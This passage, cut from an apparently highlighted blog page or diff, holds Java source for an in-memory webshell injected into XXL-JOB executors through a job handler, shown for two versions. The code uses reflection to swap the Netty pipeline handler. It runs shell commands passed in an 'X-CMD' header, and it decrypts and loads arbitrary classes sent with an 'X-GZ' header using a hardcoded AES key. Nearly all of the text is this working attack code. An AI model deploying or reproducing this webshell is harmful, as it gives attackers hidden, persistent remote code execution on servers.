AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry = <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry(httpRequest,<span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>());</span><br><span class="line">                requestThreadLocal.set(simpleEntry);</span><br><span class="line">                <span class="keyword">if</span>(httpRequest.headers().contains(<span class="string">&quot;X-CMD&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpRequest.headers().get(<span class="string">&quot;X-CMD&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">execResult</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    ArrayList&lt;String&gt; cmdList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/c&quot;</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmdList.add(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">                        cmdList.add(<span class="string">&quot;-c&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    cmdList.add(cmd);</span><br><span class="line">                    String[] cmds = cmdList.toArray(<span class="keyword">new</span> <span class="title class_">String</span>[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">                    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmds).start();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line">                    <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(inputStream, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        execResult =execResult+line;</span><br><span class="line">                    &#125;</span><br><span class="line">                    process.destroy();</span><br><span class="line">                    send(ctx, execResult, HttpResponseStatus.OK);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (httpRequest.headers().contains(<span class="string">&quot;X-GZ&quot;</span>)) &#123;</span><br><span class="line">                    <span class="type">HttpContent</span> <span class="variable">httpContent</span> <span class="operator">=</span> (HttpContent)msg;</span><br><span class="line">                    AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry1 = requestThreadLocal.get();</span><br><span class="line">                    <span class="keyword">if</span> (simpleEntry1 == <span class="literal">null</span>)&#123;</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">HttpRequest</span> <span class="variable">httpRequest1</span> <span class="operator">=</span> simpleEntry1.getKey();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">contentBuf</span> <span class="operator">=</span> simpleEntry1.getValue();</span><br><span class="line"></span><br><span class="line">                    <span class="type">ByteBuf</span> <span class="variable">byteBuf</span> <span class="operator">=</span> httpContent.content();</span><br><span class="line">                    <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> byteBuf.capacity();</span><br><span class="line">                    <span class="type">byte</span>[] requestContent = <span class="keyword">new</span> <span class="title class_">byte</span>[size];</span><br><span class="line">                    byteBuf.getBytes(<span class="number">0</span>,requestContent,<span class="number">0</span>,requestContent.length);</span><br><span class="line"></span><br><span class="line">                    contentBuf.write(requestContent);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (httpContent <span class="keyword">instanceof</span> LastHttpContent)&#123;</span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="type">byte</span>[] data =  x(contentBuf.toByteArray(), <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">if</span> (payload == <span class="literal">null</span>) &#123;</span><br><span class="line">                                payload = defClass(data);</span><br><span class="line">                                gzsend(ctx,x(<span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>], <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">f</span> <span class="operator">=</span> payload.newInstance();</span><br><span class="line">                                java.io.<span class="type">ByteArrayOutputStream</span> <span class="variable">arrOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();</span><br><span class="line">                                f.equals(arrOut);</span><br><span class="line">                                f.equals(data);</span><br><span class="line">                                f.toString();</span><br><span class="line">                                gzsend(ctx,x(arrOut.toByteArray(), <span class="literal">true</span>),HttpResponseStatus.OK);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                            ctx.fireChannelRead(httpRequest1);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ctx.fireChannelRead(msg);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    ctx.fireChannelRead(msg);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ctx.fireChannelRead(msg);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">send</span><span class="params">(ChannelHandlerContext ctx, String context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context, CharsetUtil.UTF_8));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">gzsend</span><span class="params">(ChannelHandlerContext ctx, <span class="type">byte</span>[] context, HttpResponseStatus status)</span> &#123;</span><br><span class="line">            <span class="type">FullHttpResponse</span> <span class="variable">response</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DefaultFullHttpResponse</span>(HttpVersion.HTTP_1_1, status, Unpooled.copiedBuffer(context));</span><br><span class="line">            response.headers().set(HttpHeaderNames.CONTENT_TYPE, <span class="string">&quot;text/plain; charset=UTF-8&quot;</span>);</span><br><span class="line">            ctx.writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ExecutorBiz executorBiz;</span><br><span class="line">    <span class="keyword">private</span> String accessToken;</span><br><span class="line">    <span class="keyword">private</span> Thread thread;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ReturnT&lt;String&gt; <span class="title function_">execute</span><span class="params">(String param)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        XxlJobLogger.log(<span class="string">&quot;XXL-JOB, Hello World.&quot;</span>);</span><br><span class="line">        executorBiz = <span class="keyword">new</span> <span class="title class_">ExecutorBizImpl</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">bossGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">bizThreadPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">200</span>,</span><br><span class="line">                <span class="number">60L</span>,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;(<span class="number">2000</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r, <span class="string">&quot;xxl-rpc, EmbedServer bizThreadPool-&quot;</span> + r.hashCode());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RejectedExecutionHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rejectedExecution</span><span class="params">(Runnable r, ThreadPoolExecutor executor)</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;xxl-job, EmbedServer bizThreadPool is EXHAUSTED!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            XxlJobLogger.log(<span class="string">&quot;NioEventLoop find&quot;</span>);</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> <span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">EmbedServer</span>.EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                XxlJobLogger.log(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                        XxlJobLogger.log(ignored.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            XxlJobLogger.log(e.toString());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ReturnT.SUCCESS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)&#123;</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        <span class="keyword">return</span> field.get(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-3-0"><a href="#2-3-0" class="headerlink" title="2.3.0"></a>2.3.0</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.xxl.job.executor.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.ExecutorBiz;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.impl.ExecutorBizImpl;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.server.EmbedServer;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.Unpooled;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.nio.NioEventLoopGroup;</span><br><span class="line"><span class="keyword">import</span> io.netty.channel.socket.SocketChannel;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.codec.http.*;</span><br><span class="line"><span class="keyword">import</span> io.netty.handler.timeout.IdleStateHandler;</span><br><span class="line"><span class="keyword">import</span> io.netty.util.CharsetUtil;</span><br><span class="line"><span class="keyword">import</span> io.netty.buffer.ByteBuf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.biz.model.ReturnT;</span><br><span class="line"><span class="keyword">import</span> com.xxl.job.core.handler.IJobHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DemoGlueJobHandler</span> <span class="keyword">extends</span> <span class="title class_">IJobHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> ExecutorBiz executorBiz;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">String</span> <span class="variable">accessToken</span> <span class="operator">=</span> <span class="string">&quot;XXL-JOB-ACCESS-TOKEN&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> Thread thread;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        executorBiz = <span class="keyword">new</span> <span class="title class_">ExecutorBizImpl</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">bossGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">EventLoopGroup</span> <span class="variable">workerGroup</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NioEventLoopGroup</span>();</span><br><span class="line">        <span class="type">ThreadPoolExecutor</span> <span class="variable">bizThreadPool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ThreadPoolExecutor</span>(</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">200</span>,</span><br><span class="line">                <span class="number">60L</span>,</span><br><span class="line">                TimeUnit.SECONDS,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Runnable&gt;(<span class="number">2000</span>),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ThreadFactory</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> Thread <span class="title function_">newThread</span><span class="params">(Runnable r)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(r, <span class="string">&quot;xxl-rpc, EmbedServer bizThreadPool-&quot;</span> + r.hashCode());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">RejectedExecutionHandler</span>() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">rejectedExecution</span><span class="params">(Runnable r, ThreadPoolExecutor executor)</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;xxl-job, EmbedServer bizThreadPool is EXHAUSTED!&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ThreadGroup</span> <span class="variable">group</span> <span class="operator">=</span> Thread.currentThread().getThreadGroup();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">threads</span> <span class="operator">=</span> group.getClass().getDeclaredField(<span class="string">&quot;threads&quot;</span>);</span><br><span class="line">            threads.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Thread[] allThreads = (Thread[]) threads.get(group);</span><br><span class="line">            <span class="keyword">for</span> (Thread thread : allThreads) &#123;</span><br><span class="line">                <span class="keyword">if</span> (thread != <span class="literal">null</span> &amp;&amp; thread.getName().contains(<span class="string">&quot;nioEventLoopGroup&quot;</span>)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        Object target;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            target = getFieldValue(getFieldValue(getFieldValue(thread, <span class="string">&quot;target&quot;</span>), <span class="string">&quot;runnable&quot;</span>), <span class="string">&quot;val\$eventExecutor&quot;</span>);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                            <span class="keyword">continue</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (target.getClass().getName().endsWith(<span class="string">&quot;NioEventLoop&quot;</span>)) &#123;</span><br><span class="line">                            <span class="type">HashSet</span> <span class="variable">set</span> <span class="operator">=</span> (HashSet) getFieldValue(getFieldValue(target, <span class="string">&quot;unwrappedSelector&quot;</span>), <span class="string">&quot;keys&quot;</span>);</span><br><span class="line">                            <span class="keyword">if</span> (!set.isEmpty()) &#123;</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">keys</span> <span class="operator">=</span> set.toArray()[<span class="number">0</span>];</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">pipeline</span> <span class="operator">=</span> getFieldValue(getFieldValue(keys, <span class="string">&quot;attachment&quot;</span>), <span class="string">&quot;pipeline&quot;</span>);</span><br><span class="line">                                <span class="type">Object</span> <span class="variable">aggregator</span> <span class="operator">=</span> getFieldValue(getFieldValue(getFieldValue(pipeline, <span class="string">&quot;head&quot;</span>), <span class="string">&quot;next&quot;</span>), <span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                                setFieldValue(aggregator, <span class="string">&quot;childHandler&quot;</span>, <span class="keyword">new</span> <span class="title class_">ChannelInitializer</span>&lt;SocketChannel&gt;() &#123;</span><br><span class="line">                                    <span class="meta">@Override</span></span><br><span class="line">                                    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">initChannel</span><span class="params">(SocketChannel channel)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                                        channel.pipeline()</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">IdleStateHandler</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">30</span> * <span class="number">3</span>, TimeUnit.SECONDS))  <span class="comment">// beat 3N, close if idle</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpServerCodec</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">HttpObjectAggregator</span>(<span class="number">5</span> * <span class="number">1024</span> * <span class="number">1024</span>))  <span class="comment">// merge request &amp; reponse to FULL</span></span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">NettyThreadHandler</span>())</span><br><span class="line">                                                .addLast(<span class="keyword">new</span> <span class="title class_">EmbedServer</span>.EmbedHttpServerHandler(executorBiz, accessToken, bizThreadPool));</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;);</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (Exception ignored) &#123;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@ChannelHandler</span>.Sharable</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NettyThreadHandler</span> <span class="keyword">extends</span> <span class="title class_">ChannelDuplexHandler</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">xc</span> <span class="operator">=</span> <span class="string">&quot;3c6e0b8a9c15224a&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">pass</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">        <span class="type">String</span> <span class="variable">md5</span> <span class="operator">=</span> md5str(pass + xc);</span><br><span class="line">        <span class="keyword">private</span> Class <span class="title function_">defClass</span><span class="params">(<span class="type">byte</span>[] classbytes)</span><span class="keyword">throws</span> Exception&#123;</span><br><span class="line">            <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[<span class="number">0</span>],Thread.currentThread().getContextClassLoader());</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> (Class) method.invoke(urlClassLoader,classbytes,<span class="number">0</span>,classbytes.length);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s, <span class="type">boolean</span> m) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                javax.crypto.<span class="type">Cipher</span> <span class="variable">c</span> <span class="operator">=</span> javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                c.init(m ? <span class="number">1</span> : <span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> c.doFinal(s);</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">md5str</span><span class="params">(String s)</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                java.security.MessageDigest m;</span><br><span class="line">                m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);</span><br><span class="line">                m.update(s.getBytes(), <span class="number">0</span>, s.length());</span><br><span class="line">                ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();</span><br><span class="line">            &#125; <span class="keyword">catch</span>(Exception e) &#123;&#125;</span><br><span class="line">            <span class="keyword">return</span> ret;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span> ThreadLocal&lt;AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt;&gt; requestThreadLocal = <span class="keyword">new</span> <span class="title class_">ThreadLocal</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">static</span>   Class payload;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">channelRead</span><span class="params">(ChannelHandlerContext ctx, Object msg)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">            <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> HttpRequest)&#123;</span><br><span class="line">                <span class="type">HttpRequest</span> <span class="variable">httpRequest</span> <span class="operator">=</span> (HttpRequest) msg;</span><br><span class="line">                AbstractMap.SimpleEntry&lt;HttpRequest,ByteArrayOutputStream&gt; simpleEntry = <span class="keyword">new</span> <span class="title class_">AbstractMap</span>.SimpleEntry(httpRequest,<span class="keyword">new</span> <span class="title 